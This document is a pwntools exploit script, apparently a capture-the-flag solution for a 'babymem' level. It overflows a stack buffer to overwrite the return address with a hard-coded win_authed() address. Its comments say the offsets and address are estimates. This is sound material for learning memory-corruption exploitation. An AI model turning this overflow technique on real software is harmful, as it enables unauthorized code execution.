#!/usr/bin/env python3
from pwn import *

# 为目标架构设置上下文
context.arch = 'amd64'

# 启动进程
p = process('/challenge/babymem_level6.1')

# 准备有效载荷
buffer_size = 32  # Adjusted based on actual overflow point found via debugging
padding_to_ret_address = 8  # This should be adjusted based on stack layout analysis

# 获取win_authed()函数地址，假设你已经通过静态分析找到正确的地址
win_func_address = p64(0x401A4F)  # 此地址需要通过分析获得

# 让pwnlib等待输入有效载荷大小的提示，并发送'200'
p.sendlineafter("Payload size: ", b"200")

# 构造溢出并覆盖返回地址的有效载荷
payload = b'A' * buffer_size
payload += b'B' * padding_to_ret_address
payload += win_func_address

# 发送恶意有效载荷
p.sendline(payload)

# 与进程进行交互，以查看输出或调试
p.interactive()